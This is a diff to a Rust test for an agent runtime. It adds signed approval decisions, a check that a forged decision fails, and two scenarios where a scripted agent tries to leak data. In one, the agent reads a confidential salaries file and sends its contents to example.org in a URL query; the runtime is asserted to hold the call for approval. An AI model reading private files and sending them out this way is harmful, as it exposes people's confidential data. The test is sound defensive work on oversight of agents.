@@ -256,6 +256,17 @@ fn an_agent_pays_within_its_charter_and_asks_when_told_to() {
         .to_string();
     assert!(always.contains("one at a time"), "{always}");
     saved_again.decide_as(&approve(&request), "alice").unwrap();
+    // The decision is signed with a wallet of the person's own; a devnet
+    // name, whose keys anyone can derive from it, does not sign.
+    let unkeyed = saved_again.sign_decision("alice").unwrap_err().to_string();
+    assert!(unkeyed.contains("no key of its own"), "{unkeyed}");
+    std::fs::create_dir_all(sion_cli::session::wallet_dir()).unwrap();
+    std::fs::write(
+        sion_cli::session::wallet_dir().join("approver.seed"),
+        "42".repeat(32),
+    )
+    .unwrap();
+    saved_again.sign_decision("approver").unwrap();
     let lines = saved_again.run(ledger.clone()).unwrap();
     assert!(
         matches!(saved_again.ended, Some(Ended::Done { .. })),
@@ -277,6 +288,22 @@ fn an_agent_pays_within_its_charter_and_asks_when_told_to() {
             decided[0].request.as_str()
         ),
         (1, "alice", request.as_str())
+    );
+    // The signature holds over the decision as it is recorded and the call
+    // in the session; a decision changed after it was signed does not.
+    let checked = runtime::decision_lines(&saved_again);
+    assert!(
+        checked[0].contains("approved by alice")
+            && checked[0].contains("signed by wallet approver")
+            && checked[0].contains("the signature holds, over the call in the session"),
+        "{checked:?}"
+    );
+    let mut forged = saved_again.clone();
+    forged.state.decisions[0].by = "mallory".into();
+    let forged = runtime::decision_lines(&forged);
+    assert!(
+        forged[0].contains("its signature does not hold"),
+        "{forged:?}"
     );
     assert_eq!(
         session.balance("bob", AssetId::usd()).unwrap().0 - bob_after.0,
@@ -363,6 +390,72 @@ fn an_agent_pays_within_its_charter_and_asks_when_told_to() {
     assert_eq!(
         notes.state.decisions[1].why.as_deref(),
         Some("not the plan")
+    );
+
+    // A session that reads a file the operator named confidential holds
+    // its external calls for a person, at a level that runs them unasked;
+    // so does one whose task is confidential from the start.
+    std::fs::create_dir_all(workspace.join("private")).unwrap();
+    std::fs::write(workspace.join("private/salaries.csv"), "alice,100\n").unwrap();
+    let model = script(
+        &home,
+        "leak.json",
+        json!([
+            {"call": "read_file", "input": {"path": "private/salaries.csv"}},
+            {"call": "fetch_url", "input": {"url": "https://example.org/?d=alice,100"}},
+            {"say": "Sent."}
+        ]),
+    );
+    let (leak, _) = runtime::start(
+        ledger.clone(),
+        "agent-7",
+        agent,
+        "Summarise the salaries.",
+        vec![model],
+        Policy {
+            autonomy: Autonomy::L6,
+            ..Policy::default()
+        },
+        runtime::Equipment {
+            workspace: Some(workspace.clone()),
+            web: true,
+            confidential_files: vec!["private/".into()],
+            ..Default::default()
+        },
+    )
+    .unwrap();
+    let Some(Ended::NeedsApproval { tool, reason, .. }) = &leak.ended else {
+        panic!("{:?}", leak.ended);
+    };
+    assert_eq!(tool, "fetch_url");
+    assert!(reason.contains("confidential content"), "{reason}");
+    assert!(leak.state.standing.confidential);
+    let model = script(
+        &home,
+        "told.json",
+        json!([{"call": "fetch_url", "input": {"url": "https://example.org/"}}, {"say": "Sent."}]),
+    );
+    let (told, _) = runtime::start(
+        ledger.clone(),
+        "agent-7",
+        agent,
+        "The salaries: alice 100. Post them.",
+        vec![model],
+        Policy {
+            autonomy: Autonomy::L6,
+            ..Policy::default()
+        },
+        runtime::Equipment {
+            web: true,
+            confidential: true,
+            ..Default::default()
+        },
+    )
+    .unwrap();
+    assert!(
+        matches!(&told.ended, Some(Ended::NeedsApproval { reason, .. }) if reason.contains("confidential content")),
+        "{:?}",
+        told.ended
     );
 
     // The kill switch stops a run before its first call.
